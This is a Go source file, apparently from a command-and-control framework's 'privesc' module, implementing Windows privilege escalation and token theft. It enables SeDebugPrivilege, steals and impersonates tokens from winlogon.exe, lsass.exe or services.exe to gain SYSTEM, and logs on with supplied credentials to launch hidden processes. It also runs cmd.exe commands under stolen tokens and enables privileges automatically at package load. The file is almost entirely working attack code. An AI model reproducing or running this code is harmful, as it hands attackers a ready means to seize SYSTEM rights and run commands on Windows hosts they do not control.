package privesc

import (
	"fmt"
	"bytes"
	"sync"
	"unsafe"
	"syscall"

	"golang.org/x/sys/windows"
	"mbeubeu-c2/src/exploits/privesc/syscalls"
)

var (
    modadvapi32 = windows.NewLazySystemDLL("advapi32.dll")

    procImpersonateLoggedOnUser = modadvapi32.NewProc("ImpersonateLoggedOnUser")
    procRevertToSelf            = modadvapi32.NewProc("RevertToSelf")
)



var (
    CurrentToken windows.Token
    tokenMutex   sync.RWMutex
)
type PrivilegeInfo struct {
	Name      string
	Enabled   bool
	Available bool
}

type SidAndAttributes struct {
    Sid        *windows.SID
    Attributes uint32
}


type TokenMandatoryLabel struct {
    Label windows.SIDAndAttributes
}

func ImpersonateLoggedOnUser(token windows.Token) error {
    r1, _, e1 := procImpersonateLoggedOnUser.Call(uintptr(token))
    if r1 == 0 {
        if e1 != nil && e1 != windows.Errno(0) {
            return e1
        }
        return syscall.EINVAL
    }
    return nil
}

func RevertToSelf() error {
    r1, _, e1 := procRevertToSelf.Call()
    if r1 == 0 {
        if e1 != nil && e1 != windows.Errno(0) {
            return e1
        }
        return syscall.EINVAL
    }
    return nil
}


// RunAs executes a command with specified credentials
func RunAs(domain, username, password, command string) (int, error) {
	const (
		LOGON32_LOGON_BATCH       = 3
		LOGON32_PROVIDER_DEFAULT  = 0
		CREATE_UNICODE_ENVIRONMENT = 0x00000400
	)

	// Convert strings to UTF16 pointers
	domainPtr, _ := windows.UTF16PtrFromString(domain)
	userPtr, _ := windows.UTF16PtrFromString(username)
	passPtr, _ := windows.UTF16PtrFromString(password)
	cmdLine, _ := windows.UTF16PtrFromString(command)

	// Get user token
	var token windows.Token
	err := syscalls.LogonUser(
		userPtr,
		domainPtr,
		passPtr,
		LOGON32_LOGON_BATCH,
		LOGON32_PROVIDER_DEFAULT,
		&token,
	)
	if err != nil {
		return 0, fmt.Errorf("LogonUser failed: %w", err)
	}
	defer token.Close()

	// Duplicate token
	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(
		token,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&primaryToken,
	)
	if err != nil {
		return 0, fmt.Errorf("DuplicateTokenEx failed: %w", err)
	}
	defer primaryToken.Close()

	// Enable required privileges
	enablePrivileges(primaryToken)

	// Create process with token
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	err = syscalls.CreateProcessWithTokenW(
		primaryToken,
		0, // Logon flags
		nil,
		cmdLine,
		windows.CREATE_NO_WINDOW|CREATE_UNICODE_ENVIRONMENT,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return 0, fmt.Errorf("CreateProcessWithTokenW failed: %w", err)
	}

	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	return int(pi.ProcessId), nil
}



func MakeToken(domain, username, password string) error {
    const (
        LOGON32_LOGON_NEW_CREDENTIALS = 9
    )

    domainPtr, _ := windows.UTF16PtrFromString(domain)
    userPtr, _ := windows.UTF16PtrFromString(username)
    passPtr, _ := windows.UTF16PtrFromString(password)

    // 1. Create network logon token
    var token windows.Token
    err := syscalls.LogonUser(
        userPtr,
        domainPtr,
        passPtr,
        LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT,
        &token,
    )
    if err != nil {
        return fmt.Errorf("LogonUser failed: %w", err)
    }
    defer token.Close()

    // 2. Duplicate to primary token with impersonation rights
    var primaryToken windows.Token


    err = windows.DuplicateTokenEx(
        token,
        windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|
            windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_ADJUST_DEFAULT,
        nil,
        windows.SecurityImpersonation,
        windows.TokenPrimary,
        &primaryToken,
    )

    if err != nil {
        return fmt.Errorf("DuplicateTokenEx failed: %w", err)
    }

    if err := enablePrivileges(primaryToken); err != nil {
        return fmt.Errorf("privilege enablement failed: %w", err)
    }

    if err := setTokenIntegrityHigh(primaryToken); err != nil {
        return fmt.Errorf("integrity elevation failed: %w", err)
    }


    CurrentToken = primaryToken
    return nil
}


func setTokenIntegrityHigh(token windows.Token) error {
    // Create High Integrity SID
    sid, err := windows.StringToSid("S-1-16-12288")
    if err != nil {
        return fmt.Errorf("SID creation failed: %w", err)
    }

    // Use proper Windows structure
    tml := &struct {
        Label windows.SIDAndAttributes
    }{
        Label: windows.SIDAndAttributes{
            Sid:        sid,
            Attributes: windows.SE_GROUP_INTEGRITY,
        },
    }

    // Set token information
    err = windows.SetTokenInformation(
        token,
        windows.TokenIntegrityLevel,
        (*byte)(unsafe.Pointer(tml)),
        uint32(unsafe.Sizeof(*tml)),
    )
    if err != nil {
        return fmt.Errorf("SetTokenInformation failed: %w", err)
    }

    return nil
}



func enablePrivileges(token windows.Token) error {
    requiredPrivs := []string{
        "SeAssignPrimaryTokenPrivilege",
        "SeImpersonatePrivilege",
        "SeTcbPrivilege",
    }

    var lastError error
    for _, priv := range requiredPrivs {
        var luid windows.LUID
        privPtr, _ := windows.UTF16PtrFromString(priv)
        if err := windows.LookupPrivilegeValue(nil, privPtr, &luid); err != nil {
            lastError = fmt.Errorf("LookupPrivilegeValue(%s) failed: %w", priv, err)
            continue
        }

        privs := windows.Tokenprivileges{
            PrivilegeCount: 1,
            Privileges: [1]windows.LUIDAndAttributes{{
                Luid:       luid,
                Attributes: windows.SE_PRIVILEGE_ENABLED,
            }},
        }

        if err := windows.AdjustTokenPrivileges(
            token,
            false,
            &privs,
            0,
            nil,
            nil,
        ); err != nil {
            lastError = fmt.Errorf("AdjustTokenPrivileges(%s) failed: %w", priv, err)
        }
    }
    return lastError
}


func hasPrivilege(privs []PrivilegeInfo, name string) bool {
    for _, p := range privs {
        if p.Name == name {
            return true
        }
    }
    return false
}
// Modified GetPrivs to accept a token
func GetTokenPrivs(token windows.Token) ([]PrivilegeInfo, error) {
    var size uint32
    err := windows.GetTokenInformation(
        token,
        windows.TokenPrivileges,
        nil,
        0,
        &size,
    )
    if err != nil && err != windows.ERROR_INSUFFICIENT_BUFFER {
        return nil, fmt.Errorf("GetTokenInformation failed: %w", err)
    }

    buffer := make([]byte, size)
    err = windows.GetTokenInformation(
        token,
        windows.TokenPrivileges,
        &buffer[0],
        size,
        &size,
    )
    if err != nil {
        return nil, fmt.Errorf("GetTokenInformation failed: %w", err)
    }

    privileges := (*windows.Tokenprivileges)(unsafe.Pointer(&buffer[0]))
    privsSlice := unsafe.Slice(&privileges.Privileges[0], privileges.PrivilegeCount)
    privInfos := make([]PrivilegeInfo, privileges.PrivilegeCount)

    for i := 0; i < int(privileges.PrivilegeCount); i++ {
        luidAndAttr := privsSlice[i]
        var nameBuffer [256]uint16
        nameLen := uint32(len(nameBuffer))

        err := syscalls.LookupPrivilegeName(
            nil,
            &luidAndAttr.Luid,
            &nameBuffer[0],
            &nameLen,
        )
        if err != nil {
            continue
        }

        privInfos[i] = PrivilegeInfo{
            Name:      windows.UTF16ToString(nameBuffer[:nameLen]),
            Enabled:   (luidAndAttr.Attributes & windows.SE_PRIVILEGE_ENABLED) != 0,
            Available: (luidAndAttr.Attributes & windows.SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0,
        }
    }

    return privInfos, nil
}




func verifyPrivileges(token windows.Token) bool {
    privs, err := GetPrivs() // Use your existing GetPrivs implementation
    if err != nil {
        return false
    }

    required := map[string]bool{
        "SeImpersonatePrivilege":        true,
	"SeTakeOwnershipPrivilege":      true,
    }

    for _, p := range privs {
        if required[p.Name] && !p.Enabled {
            return false
        }
        delete(required, p.Name)
    }

    return len(required) == 0
}

func setTokenIntegrityLevel(token windows.Token, integritySid *windows.SID) error {
    // Define TOKEN_MANDATORY_LABEL struct
    type TOKEN_MANDATORY_LABEL struct {
        Label windows.SIDAndAttributes
    }

    tml := TOKEN_MANDATORY_LABEL{
        Label: windows.SIDAndAttributes{
            Sid:        integritySid,
            Attributes: windows.SE_GROUP_INTEGRITY,
        },
    }

    size := uint32(unsafe.Sizeof(tml)) + uint32(integritySid.Len())
    buf := make([]byte, size)
    copy(buf, (*[unsafe.Sizeof(tml)]byte)(unsafe.Pointer(&tml))[:])
    copy(buf[unsafe.Sizeof(tml):], (*[1 << 20]byte)(unsafe.Pointer(integritySid))[:integritySid.Len()])

    return windows.SetTokenInformation(
        token,
        windows.TokenIntegrityLevel,
        &buf[0],
        size,
    )
}

/*
// Token Management
func MakeToken(domain, username, password string) error {
    const (
        LOGON32_LOGON_INTERACTIVE = 2  // Provides necessary privileges
        LOGON32_PROVIDER_DEFAULT = 0
    )

    domainPtr, _ := windows.UTF16PtrFromString(domain)
    userPtr, _ := windows.UTF16PtrFromString(username)
    passPtr, _ := windows.UTF16PtrFromString(password)

    // 1. Create initial token
    var token windows.Token
    err := syscalls.LogonUser(
        userPtr,
        domainPtr,
        passPtr,
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        &token,
    )
    if err != nil {
        return fmt.Errorf("LogonUser failed: %w", err)
    }

    // 2. Duplicate to primary token
    var primaryToken windows.Token
    err = windows.DuplicateTokenEx(
        token,
        windows.TOKEN_ALL_ACCESS,
        nil,
        windows.SecurityImpersonation,
        windows.TokenPrimary,
        &primaryToken,
    )
    if err != nil {
        return fmt.Errorf("DuplicateTokenEx failed: %w", err)
    }

    // 3. Enable critical privileges
    enablePrivileges(primaryToken)
    CurrentToken = primaryToken
    return nil
}


func enablePrivileges(token windows.Token) {
    privileges := []string{
        "SeAssignPrimaryTokenPrivilege",
        "SeImpersonatePrivilege",
        "SeTakeOwnershipPrivilege", 
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeDebugPrivilege",
    }

    for _, priv := range privileges {
        var luid windows.LUID
        privPtr, _ := windows.UTF16PtrFromString(priv)
        err := windows.LookupPrivilegeValue(nil, privPtr, &luid)
        if err != nil {
            continue // Privilege not available on system
        }

        privs := windows.Tokenprivileges{
            PrivilegeCount: 1,
            Privileges: [1]windows.LUIDAndAttributes{{
                Luid:       luid,
                Attributes: windows.SE_PRIVILEGE_ENABLED,
            }},
        }

        // Check result of AdjustTokenPrivileges
        err = windows.AdjustTokenPrivileges(
            token,
            false,
            &privs,
            0,
            nil,
            nil,
        )
        if err != nil {
            // Log or handle error
        }
    }
}


*/


func RevertToSelft() {
	if CurrentToken != 0 {
		windows.RevertToSelf()
		CurrentToken.Close()
		CurrentToken = 0
	}
}

// revtoself is a convenience alias to RevertToSelf.

func Revtoself() {
	RevertToSelf()
}


// Privilege Operations
func GetPrivs() ([]PrivilegeInfo, error) {
	var token windows.Token
	err := syscalls.OpenProcessToken(
		windows.CurrentProcess(),
		syscalls.TOKEN_QUERY,
		&token,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcessToken failed: %w", err)
	}
	defer token.Close()

	var size uint32
	err = windows.GetTokenInformation(
		token,
		windows.TokenPrivileges,
		nil,
		0,
		&size,
	)
	if err != nil && err != windows.ERROR_INSUFFICIENT_BUFFER {
		return nil, fmt.Errorf("GetTokenInformation failed: %w", err)
	}

	buffer := make([]byte, size)
	err = windows.GetTokenInformation(
		token,
		windows.TokenPrivileges,
		&buffer[0],
		size,
		&size,
	)
	if err != nil {
		return nil, fmt.Errorf("GetTokenInformation failed: %w", err)
	}

	privileges := (*windows.Tokenprivileges)(unsafe.Pointer(&buffer[0]))

	// Create a slice that properly represents all privileges
	privsSlice := unsafe.Slice(&privileges.Privileges[0], privileges.PrivilegeCount)
	privInfos := make([]PrivilegeInfo, privileges.PrivilegeCount)

	for i := 0; i < int(privileges.PrivilegeCount); i++ {
		luidAndAttr := privsSlice[i]
		var nameBuffer [256]uint16
		nameLen := uint32(len(nameBuffer))

		err := syscalls.LookupPrivilegeName(
			nil,
			&luidAndAttr.Luid,
			&nameBuffer[0],
			&nameLen,
		)
		if err != nil {
			continue
		}

		privInfos[i] = PrivilegeInfo{
			Name:      windows.UTF16ToString(nameBuffer[:nameLen]),
			Enabled:   (luidAndAttr.Attributes & windows.SE_PRIVILEGE_ENABLED) != 0,
			Available: (luidAndAttr.Attributes & windows.SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0,
		}
	}

	return privInfos, nil

}


func enablePrivilege(token windows.Token, privilege string) {
    var luid windows.LUID
    if err := windows.LookupPrivilegeValue(nil, 
        windows.StringToUTF16Ptr(privilege), &luid); err != nil {
        return
    }

    privs := windows.Tokenprivileges{
        PrivilegeCount: 1,
        Privileges: [1]windows.LUIDAndAttributes{{
            Luid:       luid,
            Attributes: windows.SE_PRIVILEGE_ENABLED,
        }},
    }

    windows.AdjustTokenPrivileges(token, false, &privs, 0, nil, nil)
}



func EnablePrivilege(name string) error {
	var token windows.Token
	err := syscalls.OpenProcessToken(
		windows.CurrentProcess(),
		syscalls.TOKEN_ADJUST_PRIVILEGES|syscalls.TOKEN_QUERY,
		&token,
	)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(
		nil,
		windows.StringToUTF16Ptr(name),
		&luid,
	)
	if err != nil {
		return fmt.Errorf("LookupPrivilegeValue failed: %w", err)
	}

	privs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{{
			Luid:       luid,
			Attributes: windows.SE_PRIVILEGE_ENABLED,
		}},
	}

	return windows.AdjustTokenPrivileges(
		token,
		false,
		&privs,
		uint32(unsafe.Sizeof(privs)),
		nil,
		nil,
	)
}

// Process Operations
func ImpersonateProcess(pid uint32) error {
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	var hToken windows.Token
	err = windows.OpenProcessToken(
		hProcess,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY,
		&hToken,
	)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %w", err)
	}

	var duplicatedToken windows.Token
	err = windows.DuplicateTokenEx(
		hToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenImpersonation,
		&duplicatedToken,
	)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx failed: %w", err)
	}

	CurrentToken = duplicatedToken
	return syscalls.ImpersonateLoggedOnUser(duplicatedToken)
}

func GetSystem() error {
	if err := EnablePrivilege("SeDebugPrivilege"); err != nil {
		return fmt.Errorf("privilege escalation failed: %w", err)
	}

	processes := []string{"winlogon.exe", "lsass.exe", "services.exe"}
	var pid uint32
	var err error

	for _, name := range processes {
		pid, err = FindProcessID(name)
		if err == nil {
			break
		}
	}

	if pid == 0 {
		return fmt.Errorf("no system process found")
	}

	return ImpersonateProcess(pid)
}

// Helpers
func FindProcessID(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err = windows.Process32First(snapshot, &entry); err != nil {
		return 0, fmt.Errorf("Process32First failed: %w", err)
	}

	for {
		if windows.UTF16ToString(entry.ExeFile[:]) == name {
			return entry.ProcessID, nil
		}

		if err = windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process not found: %s", name)
}
func CreateProcessWithToken(command string, output *bytes.Buffer) error {
    if CurrentToken == 0 {
        return fmt.Errorf("no active token available")
    }

    // Declare all required variables
    var (
        si windows.StartupInfo
        pi windows.ProcessInformation
        sa windows.SecurityAttributes
        stdoutRd, stdoutWr windows.Handle
        cmdLine *uint16
    )

    // Initialize security attributes
    sa.Length = uint32(unsafe.Sizeof(sa))
    sa.InheritHandle = 1

    // Create output pipe
    if err := windows.CreatePipe(&stdoutRd, &stdoutWr, &sa, 0); err != nil {
        return fmt.Errorf("CreatePipe failed: %w", err)
    }
    defer windows.CloseHandle(stdoutWr)

    // Configure startup info
    si.Cb = uint32(unsafe.Sizeof(si))
    si.Flags = windows.STARTF_USESTDHANDLES
    si.StdOutput = stdoutWr
    si.StdErr = stdoutWr

    // Convert command to UTF16 pointer
    cmdLine, err := windows.UTF16PtrFromString(command)
    if err != nil {
        return fmt.Errorf("command conversion failed: %w", err)
    }

    // Create process with token
    err = syscalls.CreateProcessWithTokenW(
        CurrentToken,
        0,
        nil,
        cmdLine,
        windows.CREATE_NO_WINDOW,
        nil,
        nil,
        &si,
        &pi,
    )
    if err != nil {
        return fmt.Errorf("CreateProcessWithToken failed: %w", err)
    }
    defer windows.CloseHandle(pi.Process)
    defer windows.CloseHandle(pi.Thread)

    // Wait for process completion
    windows.WaitForSingleObject(pi.Process, windows.INFINITE)

    // Read output
    buffer := make([]byte, 4096)
    var bytesRead uint32
    
    for {
        err := windows.ReadFile(stdoutRd, buffer, &bytesRead, nil)
        if err != nil || bytesRead == 0 {
            break
        }
        output.Write(buffer[:bytesRead])
    }
    
    return nil
}


func HasToken() bool {
    tokenMutex.RLock()
    defer tokenMutex.RUnlock()

    if CurrentToken == 0 {
        return false
    }

    var dummy uint32
    err := windows.GetTokenInformation(CurrentToken, windows.TokenUser, nil, 0, &dummy)
    return err == windows.ERROR_INSUFFICIENT_BUFFER
}

func ExecuteWithToken(command string, output *bytes.Buffer) error {
    if CurrentToken == 0 {
        return fmt.Errorf("no active token")
    }

    fullCmd := fmt.Sprintf("c:\\Windows\\System32\\cmd.exe /c %s", command)
    return CreateProcessWithToken(fullCmd, output)
}


func EnsurePrivileges() error {
    var token windows.Token
    err := syscalls.OpenProcessToken(
        windows.CurrentProcess(),
        syscalls.TOKEN_ADJUST_PRIVILEGES|syscalls.TOKEN_QUERY,
        &token,
    )
    if err != nil {
        return err
    }
    defer token.Close()

    enablePrivilege(token, "SeDebugPrivilege")
    enablePrivilege(token, "SeImpersonatePrivilege")
    return nil
}

func init() {
    EnsurePrivileges()
}
